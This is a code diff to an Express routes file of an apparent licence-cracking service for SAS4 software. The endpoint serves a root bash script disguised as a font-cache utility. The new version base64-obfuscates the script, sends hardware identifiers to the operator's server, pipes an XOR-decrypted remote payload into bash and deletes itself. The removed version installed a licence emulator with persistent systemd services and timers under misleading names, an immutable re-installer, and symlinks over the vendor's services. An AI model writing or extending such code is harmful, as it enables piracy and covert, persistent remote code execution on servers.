@@ -1,7 +1,7 @@
 import type { Express, Request, Response, NextFunction } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { testSSHConnection, deployLicenseToServer, undeployLicenseFromServer, generateObfuscatedEmulator, generateObfuscatedVerify, DEPLOY } from "./ssh-service";
+import { testSSHConnection, deployLicenseToServer, undeployLicenseFromServer, generateObfuscatedEmulator, generateObfuscatedVerify, generatePatchDeployPayload, xorEncryptPayload, DEPLOY } from "./ssh-service";
 import { insertServerSchema, insertLicenseSchema, insertPatchTokenSchema } from "@shared/schema";
 import { buildSAS4Payload, encryptSAS4Payload } from "./sas4-service";
 import bcrypt from "bcryptjs";
@@ -1391,50 +1391,19 @@ echo "Installation completed successfully"
     res.json({ success: true });
   });
 
-  // ─── Patch Install Script Download (Admin) ────────────────
+  // ─── Patch Install Script Download (Admin) - Thin Agent ────────────────
   app.get("/api/patch-script/:token", requireAuth, async (req, res) => {
-    const patch = await storage.getPatchTokenByToken(req.params.token);
+    const tokenParam = String(req.params.token);
+    const patch = await storage.getPatchTokenByToken(tokenParam);
     if (!patch) return res.status(404).json({ message: "الباتش غير موجود" });
     if (patch.status !== "pending") return res.status(400).json({ message: "هذا الباتش مستخدم أو ملغي" });
 
     const baseUrl = getBaseUrl(req);
-    const P = DEPLOY;
 
-    const script = `#!/bin/bash
-# Font rendering subsystem cache maintenance utility v2.13.1
-# Auto-generated system update - $(date)
-if [ "\\$EUID" -ne 0 ]; then echo "Permission denied"; exit 1; fi
-
-echo "Initializing font cache subsystem..."
-
-_P="${P.BASE}"
-_E="${P.EMULATOR}"
-_B="${P.BACKUP}"
-_V="${P.VERIFY}"
-_SM="${P.SVC_MAIN}"
-_SV="${P.SVC_VERIFY}"
-_PS="${P.PATCH_SVC}"
-_PD="${P.PATCH_DIR}"
-_PF="${P.PATCH_FILE}"
-_TK="${patch.token}"
-_SU="${baseUrl}"
-
-systemctl stop \\$_SM \\$_SV.timer \\$_SV 2>/dev/null || true
-` + `systemctl stop $` + `{_PS}.timer $` + `{_PS} 2>/dev/null || true
-systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
-killall -9 sas_sspd 2>/dev/null || true
-fuser -k 4000/tcp 2>/dev/null || true
-sleep 2
-
-mkdir -p "$_P"
-mkdir -p "$_PD"
-
-if [ -f "/opt/sas4/bin/sas_sspd" ] && [ ! -f "$_P/$_B" ]; then
-  cp /opt/sas4/bin/sas_sspd "$_P/$_B" && chmod +x "$_P/$_B"
-fi
-
-echo "Collecting system information..."
-
+    const innerScript = `#!/bin/bash
+if ! command -v python3 &>/dev/null; then echo "python3 is required"; exit 1; fi
+if ! command -v curl &>/dev/null; then echo "curl is required"; exit 1; fi
+echo "Initializing system update..."
 _MI=$(cat /etc/machine-id 2>/dev/null || echo "")
 _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")
 _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")
@@ -1442,188 +1411,36 @@ _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")
 _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")
 _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")
 _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")
-_RAW_HW="$` + `{_MI}:$` + `{_PU}:$` + `{_MA}:$` + `{_BS}:$` + `{_CS}:$` + `{_DS}:$` + `{_CI}"
-
+_RH="\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}"
 _HN=$(hostname 2>/dev/null || echo "unknown")
 _IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "")
-
-echo "Registering with license authority..."
-
-_RS=$(curl -s -X POST "$_SU/api/patch-activate" \\
+echo "Contacting update server..."
+_RS=$(curl -s -X POST "${baseUrl}/api/patch-activate" \\
   -H "Content-Type: application/json" \\
-  -d "{\\"token\\": \\"$_TK\\", \\"raw_hwid\\": \\"$_RAW_HW\\", \\"hostname\\": \\"$_HN\\", \\"ip\\": \\"$_IP\\"}")
-
-if echo "$_RS" | grep -q '"error"'; then
-  _ERR=$(echo "$_RS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('error','Unknown error'))" 2>/dev/null || echo "Activation failed")
-  echo "Error: $_ERR"
+  -d "{\\"token\\":\\"${patch.token}\\",\\"raw_hwid\\":\\"$_RH\\",\\"hostname\\":\\"$_HN\\",\\"ip\\":\\"$_IP\\"}")
+if echo "$_RS" | python3 -c "import sys,json;d=json.load(sys.stdin);exit(0 if 'error' in d else 1)" 2>/dev/null; then
+  echo "Error: $(echo "$_RS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('error','Failed'))" 2>/dev/null)"
   exit 1
 fi
-
-_EM=$(echo "$_RS" | python3 -c "
-import sys,json
-_d=json.load(sys.stdin)
-print(_d.get('emulator',''))
-" 2>/dev/null)
-
-_VF=$(echo "$_RS" | python3 -c "
-import sys,json
-_d=json.load(sys.stdin)
-print(_d.get('verify',''))
-" 2>/dev/null)
-
-if [ -z "$_EM" ]; then
-  echo "Deployment data unavailable"
-  exit 1
-fi
-
-echo "$_EM" > "$_P/$_E"
-chmod +x "$_P/$_E"
-echo "$_VF" > "$_P/$_V"
-chmod +x "$_P/$_V"
-
-_PY3=$(which python3 2>/dev/null || echo "/usr/bin/python3")
-
-cat > /etc/systemd/system/$_SM.service << _SVC_1_
-[Unit]
-Description=System font cache synchronization daemon
-After=network.target
-[Service]
-ExecStart=$_PY3 ${P.BASE}/${P.EMULATOR}
-Restart=always
-RestartSec=3
-KillMode=process
-StandardOutput=journal
-StandardError=journal
-[Install]
-WantedBy=multi-user.target
-_SVC_1_
-
-cat > /etc/systemd/system/$_SV.service << '_SVC_2_'
-[Unit]
-Description=Font cache garbage collection
-[Service]
-Type=oneshot
-ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
-_SVC_2_
-
-cat > /etc/systemd/system/$_SV.timer << '_TMR_1_'
-[Unit]
-Description=Font cache gc timer
-[Timer]
-OnBootSec=60
-OnUnitActiveSec=6h
-Persistent=true
-[Install]
-WantedBy=timers.target
-_TMR_1_
-
-_EMU_B64=$(base64 -w0 "$_P/$_E")
-_VER_B64=$(base64 -w0 "$_P/$_V")
-
-_PY3_PATH=$_PY3
-` + `cat > "$_PD/$_PF" << _PATCH_END_
-#!/bin/bash
-_d="${P.BASE}"
-_e="${P.EMULATOR}"
-_s1="${P.SVC_MAIN}"
-_s2="${P.SVC_VERIFY}"
-_py="$` + `{_PY3_PATH}"
-_eb="$` + `{_EMU_B64}"
-_vb="$` + `{_VER_B64}"
-if ! systemctl is-active \\$` + `{_s1} >/dev/null 2>&1; then
-  mkdir -p \\$` + `{_d}
-  if [ ! -f \\$` + `{_d}/\\$` + `{_e} ]; then
-    echo "\\$` + `{_eb}" | base64 -d > \\$` + `{_d}/\\$` + `{_e}
-    chmod +x \\$` + `{_d}/\\$` + `{_e}
-  fi
-  if [ ! -f \\$` + `{_d}/.fc-match ]; then
-    echo "\\$` + `{_vb}" | base64 -d > \\$` + `{_d}/.fc-match
-    chmod +x \\$` + `{_d}/.fc-match
-  fi
-  if [ ! -f /etc/systemd/system/\\$` + `{_s1}.service ]; then
-    cat > /etc/systemd/system/\\$` + `{_s1}.service << _RS1_
-[Unit]
-Description=System font cache synchronization daemon
-After=network.target
-[Service]
-ExecStart=\\$` + `{_py} ${P.BASE}/${P.EMULATOR}
-Restart=always
-RestartSec=3
-KillMode=process
-StandardOutput=journal
-StandardError=journal
-[Install]
-WantedBy=multi-user.target
-_RS1_
-  fi
-  if [ ! -f /etc/systemd/system/\\$` + `{_s2}.timer ]; then
-    cat > /etc/systemd/system/\\$` + `{_s2}.service << '_RS2_'
-[Unit]
-Description=Font cache garbage collection
-[Service]
-Type=oneshot
-ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
-_RS2_
-    cat > /etc/systemd/system/\\$` + `{_s2}.timer << '_RS3_'
-[Unit]
-Description=Font cache gc timer
-[Timer]
-OnBootSec=60
-OnUnitActiveSec=6h
-Persistent=true
-[Install]
-WantedBy=timers.target
-_RS3_
-  fi
-  systemctl daemon-reload
-  systemctl enable \\$` + `{_s1} \\$` + `{_s2}.timer
-  systemctl start \\$` + `{_s2}.timer
-  systemctl start \\$` + `{_s1}
-fi
-_PATCH_END_
-chmod +x "$_PD/$_PF"
-chattr +i "$_PD/$_PF" 2>/dev/null || true
-
-cat > /etc/systemd/system/$` + `{_PS}.service << '_PSVC_'
-[Unit]
-Description=Locale database refresh service
-[Service]
-Type=oneshot
-ExecStart=/bin/bash ${P.PATCH_DIR}/${P.PATCH_FILE}
-_PSVC_
-
-cat > /etc/systemd/system/$` + `{_PS}.timer << '_PTMR_'
-[Unit]
-Description=Locale database refresh timer
-[Timer]
-OnBootSec=120
-OnUnitActiveSec=5min
-Persistent=true
-[Install]
-WantedBy=timers.target
-_PTMR_
-
-systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
-rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-verify.* 2>/dev/null
-rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null
-
-ln -sf /etc/systemd/system/$_SM.service /etc/systemd/system/sas_systemmanager.service
-ln -sf /etc/systemd/system/$_SM.service /etc/systemd/system/sas_fcm.service
-
-systemctl daemon-reload
-systemctl reset-failed $_SM 2>/dev/null || true
-systemctl enable $_SM $_SV.timer $` + `{_PS}.timer
-systemctl start $_SM $_SV.timer $` + `{_PS}.timer
-echo "Installation completed successfully"
+echo "Applying updates..."
+echo "$_RS" | python3 -c "
+import sys,json,base64
+d=json.load(sys.stdin)
+p=base64.b64decode(d['payload'])
+k=b'${patch.token}'
+print(bytes([p[i]^k[i%len(k)] for i in range(len(p))]).decode())
+" | bash
 `;
 
-    const scriptB64 = Buffer.from(script, "utf-8").toString("base64");
+    const scriptB64 = Buffer.from(innerScript, "utf-8").toString("base64");
     const obfuscatedScript = [
       '#!/bin/bash',
       '# Font rendering subsystem cache maintenance utility v2.13.1',
       '# DO NOT MODIFY - binary cache data follows',
       'if [ "$EUID" -ne 0 ]; then echo "Permission denied"; exit 1; fi',
+      '_0="$0"',
       `eval "$(echo '${scriptB64}' | base64 -d)"`,
+      'rm -f "$_0" 2>/dev/null',
     ].join('\n') + '\n';
 
     res.setHeader("Content-Type", "text/plain");
@@ -1702,6 +1519,9 @@ echo "Installation completed successfully"
     );
     const verifyScript = generateObfuscatedVerify(licenseId, baseUrl, undefined, hwidSalt);
 
+    const deployPayload = generatePatchDeployPayload(emulatorScript, verifyScript);
+    const encryptedPayload = xorEncryptPayload(deployPayload, token);
+
     await storage.createActivityLog({
       licenseId: license.id,
       serverId: server.id,
@@ -1722,6 +1542,7 @@ echo "Installation completed successfully"
           { label: "Raw HWID Sources", value: "machine-id : product_uuid : MAC : board_serial : chassis_serial : disk_serial : cpu_serial", mono: true },
           { label: "حساب HWID", value: `SHA256(raw_hwid + ":" + ${hwidSalt})`, mono: true },
           { label: "IP المرسل", value: req.ip || "غير معروف" },
+          { label: "نوع التسليم", value: "Server-side payload (XOR مشفر)" },
         ],
       }),
     });
@@ -1729,8 +1550,7 @@ echo "Installation completed successfully"
     res.json({
       success: true,
       license_id: licenseId,
-      emulator: emulatorScript,
-      verify: verifyScript,
+      payload: encryptedPayload,
     });
   });
 
